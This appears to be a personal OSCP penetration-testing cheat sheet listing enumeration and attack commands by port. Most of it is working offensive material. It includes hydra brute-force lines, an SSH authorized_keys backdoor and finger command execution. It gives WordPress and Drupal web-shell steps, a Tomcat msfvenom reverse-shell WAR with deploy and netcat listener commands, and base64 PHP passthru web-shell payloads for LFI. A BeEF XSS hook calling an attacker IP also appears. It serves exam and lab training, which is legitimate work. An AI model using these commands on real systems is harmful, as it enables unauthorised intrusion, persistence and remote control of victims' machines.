# Welcome to Zamrax's Cheat Sheet for OSCP

## Enumeration:

1. nmapAutomator:
	```
	nmapAutomator.sh -H IP -t All
	```
2. autorecon:
	```
	autorecon IP
	```
3. nmap:
	```
	nmap -T4 -A -p- IP
	```
4. enum4linux:
	```
	enum4linux -a IP
	```

## Port Enumeration and Potential Exploits:

### 21 (FTP):
1. Anonymous login is possible:
	```
	ftp IP
	ftp> USER anonymous
	ftp> PASS 
	```
2. View of FTP content:
	```
	ftp://IP
	```
3. Get files from FTP:
	```
	PASSIVE
	BINARY
	get FILE
	```
4. Upload files to FTP:
	```
	PASSIVE
	BINARY
	put FILE
	```
5. Brute force:
	```
	hydra -V -f -L USER_LIST -P /usr/share/wordlists/rockyou.txt ftp://IP -u -vV
	```
6. Vulnerability Scanning:
	```
	nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp IP
	```

### 22 (SSH)
1. Brute Force:
	```
	hydra -V -f -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt ssh://IP -u -vV
	```
2. Possible Exploit: CVE-2008-0166:
	```
	searchsploit -m 5720
	```
3. Backdoor (might be worth it):
	```
	-> Attacker
	ssh-keygen -f FILE
	chmod 600 FILE
	cat FILE.pub -> copy

	-> Victim
	echo FILE.pub >> PATH/.ssh/authorized_keys

	-> Connect
	ssh -i FILE USER@IP
	```
4. Banner grab:
	```
	ssh root@IP
	```

### 23 (Telnet)
1. Connect:
	```
	telnet IP 23
	```

### 25 (SMTP)
1. Connect:
	```
	nc IP 25
	```
2. User enumeration:
	```
	VRFY USER
	```

### 43 (WHOIS)
1. Connection:
	```
	whois -h IP -p PORT "domain.tld"
	```

### 53 (DNS)
1. Enumeration:
	```
	dnsenum DOMAIN
	dnsrecon -d DOMAIN

	nslookup
	nslookup> server IP
	nslookup> DOMAIN
	```
2. Zone Transfer
	```
	dnsrecon -d DOMAAIN -a
	dig axfr DOMAIN @website
	```
3. DNS Brute force:
	```
	https://github.com/blark/aiodnsbrute
	```

### 69 (TFTP)
1. Enumeration
	```
	nmap -n -Pn -sU -p69 -sV --script tftp-enum IP
	```

### 79 (Finger)
1. User Enumeration
	```
	finger IP
	finger USER@IP
	```
2. Command execution:
	```
	finger "|/bin/id@<IP>"
	finger "|/bin/ls -a /<IP>"
	```

### 80 & 443 (HTTP):
1. Enumeration:
	```
	done by automatic scripts
	```
2. Directory Fuzzing:
- GoBuster:
	```
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx --insecuressl
	```
(might have to use `-k` switch if HTTPS is not trustable)
- Dirbuster
	```
	trivial
	```
	(Do not forget to change file formats and supply correct directory list like above)

3. **Wordpress**
- _Enumeration_
	```
	\# Scan
	wpscan --rua -e --url IP/URL
	\# Brute force users/login
	wpscan --rua --url IP/URL -P /usr/share/wordlists/rockyou.txt -U "USER,USER"
	```
- _Theme RCE_
	```
	Appearance -> Editor -> 404 Template (at the right)
	Change the content for a php shell
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	http://<IP>/wp-content/themes/twentytwelve/404.php
	```
- _Plugin RCE_
	Follow this [Link](https://medium.com/swlh/wordpress-file-manager-plugin-exploit-for-unauthenticated-rce-8053db3512ac)
4. **Drupal**
- _Enumeration_
	```
	droopescan scan -u IP/URL
	```
- _User Enumeration_
	```
	In /user/register just try to create a username and if the name is already taken it will be notified :
	*The name admin is already taken*
	If you request a new password for an existing username :
	*Unable to send e-mail. Contact the site administrator if the problem persists.*
	If you request a new password for a non-existent username :
	*Sorry, test is not recognized as a user name or an e-mail address.*
	Accessing /user/<number> you can see the number of existing users :
	/user/1 -> Access denied (user exist)
	/user/2 -> Page not found (user doesn't exist)
	```
- _Hidden Pages Enumeration_
	```
	wfuzz -c -z range,1-500 --hc 404 URL/node/FUZZ
	```
- _Panel RCE_
	```
	You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
	Go to Modules -> (Check) PHP Filter  -> Save configuration
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
	```
5. **Joomla**
- _Enumeration_
	```
	joomscan -u URL
	./joomlavs.rb --url URL -a -v
	```
6. **Tomcat**
- _Default Credentials_
	```
	The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
	```
	```
	admin:admin
	tomcat:tomcat
	admin:<NOTHING>
	admin:s3cr3t
	tomcat:s3cr3t
	admin:tomcat
	```
- _Brute Force_
	```
	hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u
	```
- _Panel RCE_
	```
	\# Generate payload
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	```
	```
	\# Upload payload
	Tomcat6 :
	wget 'http://USER:PASSWORD@IP:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
	```
	```
	Tomcat7 and above :
	curl -v -u USER:PASSWORD -T shell.war 'http://IP:8080/manager/text/deploy?path=/shellh&update=true'
	```
	```
	\# Listener
	nc -nvlp PORT
	```
	```
	\# Execute payload
	curl http://IP:8080/shell/
	```
7. **WebDav**
	```
	davtest -url URL
	```
8. HTTP Brute Force Authentication
- _HTTP Basic Authentication_
	```
	\# Hydra
	hydra -l USER -V -P /usr/share/wordlists/rockyou.txt -s 80 -f IP http-get /URL_ENDPOINT/ -t 15
	```
- _HTTP GET request_
	```
	hydra IP -V -l USER -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes;PHPSESSID=12345myphpsessid" -t 15
	```
- _HTTP POST request_
	```
	hydra -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
	```
9. Spider / Brute force directories / files
	```
	gospider -d DEPTHS --robots --sitemap -t 15 -s URL
	```
	```
	ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u URL/FUZZ -e .php,.txt -t 15
	```
	```
	Dictionaries :
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	```
	_File backups_
	```
	file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
	```
10. Local File / Remote File Inclusion (LFI/RFI):
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
	```
- Wrappers
	```
	\# php://filter
	http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
	\# expect://
	http://example.com/index.php?page=expect://id
	\# data://
	echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
	If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
	Code execution with 
	exec
	shell_exec
	system
	passthru
	popen
	\# Example
	echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
	\# input://
	curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
	```
- Useful LFI lists
	```
	\Linux
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
	\Windows
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
	\# Both
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
	```
- Tools
	```
	kadimus --url URL
	python lfisuite.py
	```
11. Command Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
	Burp!
	```
12. Deserialization
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
	```
13. File Upload
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
	```
14. SQL Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
	https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
	```
15. XSS
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
	beef-xss
	cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
	<script src="http://IP:3000/hook.js"></script>
	```
16. Upload a file with PUT
	```
	curl -X PUT http://IP/FILE -d @FILE  -v
	```
